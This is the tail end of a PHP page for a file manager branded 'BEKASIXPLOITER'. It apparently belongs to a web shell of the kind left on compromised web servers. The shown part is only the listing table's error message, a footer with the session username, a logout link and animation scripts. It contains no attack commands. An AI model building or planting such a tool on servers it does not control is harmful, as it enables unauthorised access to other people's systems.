                                                <path fill-rule="evenodd" d="M8.586 2.586A2 2 0 0 1 10 2h4a2 2 0 0 1 2 2v2h3a1 1 0 1 1 0 2v12a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V8a1 1 0 0 1 0-2h3V4a2 2 0 0 1 .586-1.414ZM10 6h4V4h-4v2Zm1 4a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Zm4 0a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Z" clip-rule="evenodd" />
                                            </svg>
                                        </a>
                                    </div>
                                </td>
                            </tr>
                        <?php } ?>
                    </tbody>
                <?php else: ?>
                    <tbody>
                        <tr>
                            <td colspan="4" class="px-6 py-8 text-center">
                                <div class="flex flex-col items-center justify-center text-gray-500 dark:text-gray-400">
                                    <svg class="w-16 h-16 mb-4 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"/>
                                    </svg>
                                    <p class="text-lg font-semibold">Directory Is NOT Readable</p>
                                    <p class="text-sm mt-2">You don't have permission to access this directory</p>
                                </div>
                            </td>
                        </tr>
                    </tbody>
                <?php endif; ?>
            </table>
        </div>

    </div>

    <!-- Footer -->
    <div class="bg-gradient-to-r from-gray-800 to-gray-900 text-white py-8">
        <div class="container mx-auto px-4">
            <div class="flex flex-col md:flex-row items-center justify-between">
                <div class="flex items-center space-x-3 mb-4 md:mb-0">
                    <img src="https://tanyacoach.com/coach/logo.png" class="h-10 w-auto">
                    <div>
                        <p class="font-bold text-lg">BEKASIXPLOITER</p>
                        <p class="text-gray-400 text-sm">File Manager System</p>
                    </div>
                </div>
                <div class="text-center md:text-right">
                    <p class="text-gray-400 mb-2">Logged in as: <span class="text-blue-300 font-semibold"><?= htmlspecialchars($_SESSION['username']) ?></span></p>
                    <a href="?action=logout" class="inline-flex items-center space-x-2 text-gray-300 hover:text-white transition-colors">
                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
                        </svg>
                        <span>Logout</span>
                    </a>
                </div>
            </div>
            <div class="border-t border-gray-700 mt-6 pt-6 text-center">
                <p class="text-gray-500 text-sm">&copy; <?php echo date('Y'); ?> All rights reserved. Secure File Manager with Bcrypt Authentication</p>
            </div>
        </div>
    </div>

    <script>
        // Auto-hide toast notifications
        setTimeout(() => {
            const toast = document.getElementById('toast-default');
            if (toast) {
                toast.style.opacity = '0';
                toast.style.transition = 'opacity 0.5s ease';
                setTimeout(() => toast.remove(), 500);
            }
        }, 5000);

        setTimeout(() => {
            const toast = document.getElementById('toast-error');
            if (toast) {
                toast.style.opacity = '0';
                toast.style.transition = 'opacity 0.5s ease';
                setTimeout(() => toast.remove(), 500);
            }
        }, 5000);

        // Add animation classes
        document.addEventListener('DOMContentLoaded', function() {
            const rows = document.querySelectorAll('tbody tr');
            rows.forEach((row, index) => {
                row.style.animationDelay = `${index * 0.05}s`;
                row.classList.add('animate-fade-in');
            });
        });

        // Add animation for fade-in
        const style = document.createElement('style');
        style.textContent = `
            .animate-fade-in {
                animation: fadeIn 0.3s ease-out forwards;
                opacity: 0;
            }
            
            @keyframes fadeIn {
                to {
                    opacity: 1;
                }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>

</html>
<?php ob_end_flush(); ?>